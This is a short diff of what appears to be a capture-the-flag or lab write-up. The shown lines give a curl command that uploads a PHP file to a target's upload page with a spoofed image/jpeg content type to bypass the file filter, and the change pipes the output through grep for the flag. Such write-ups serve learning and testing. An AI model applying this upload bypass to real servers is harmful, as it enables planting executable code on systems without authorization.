@@ -23,7 +23,7 @@ echo '<?php echo "hello"; ?>' > test.php
 curl http://<IP_ADDRESS>/index.php?page=upload \
   -F "Upload=Upload" \
   -F "uploaded=@test.php;type=image/jpeg" \
-  -F "MAX_FILE_SIZE=100000"
+  -F "MAX_FILE_SIZE=100000" | grep "flag"
 ```
 - The PHP file is uploaded as if it’s a JPEG by spoofing the content-type.
 
